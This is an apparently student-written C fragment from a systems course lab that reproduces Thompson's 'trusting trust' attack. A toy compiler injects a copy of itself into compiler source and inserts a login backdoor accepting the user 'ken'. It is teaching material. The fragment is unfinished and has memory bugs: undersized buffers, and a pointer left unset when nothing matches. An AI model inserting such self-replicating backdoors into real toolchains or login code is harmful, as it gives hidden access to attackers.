// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

	fprintf(fp,"char prog[] = {\n");
	for(int i = 0; prog[i]; i++)
		fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
	fprintf(fp, "0 };\n");
	static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    static char compile_attack[sizeof prog];
	memcpy(compile_attack, prog, sizeof prog);	
	// not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
    char* new_prog;
    	// identity attack follows here
	char* compile_ptr;
	 
	if(compile_ptr = strstr(program, compile_sig)) {
		new_prog = (char*)malloc(strlen(program) + strlen(compile_sig));
		strncpy(new_prog, program, compile_ptr-program);
		new_prog[compile_ptr-program] = '\0';
		strcat(new_prog, compile_attack);
		char* remaining_prog = compile_ptr + strlen(compile_sig);
		strcat(new_prog, remaining_prog);
	}
    // login attack follows here
    char* login_ptr;
    
    if((login_ptr = strstr(program, login_sig))) {
        new_prog = (char*)malloc(strlen(program) + strlen(login_sig));
        strncpy(new_prog, program, login_ptr-program);
        new_prog[login_ptr-program] = '\0';
        strcat(new_prog, login_sig);
        strcat(new_prog, login_attack);
        char* remaining_prog = login_ptr + strlen(login_sig);
        strcat(new_prog, remaining_prog);
    }

    program = new_prog;
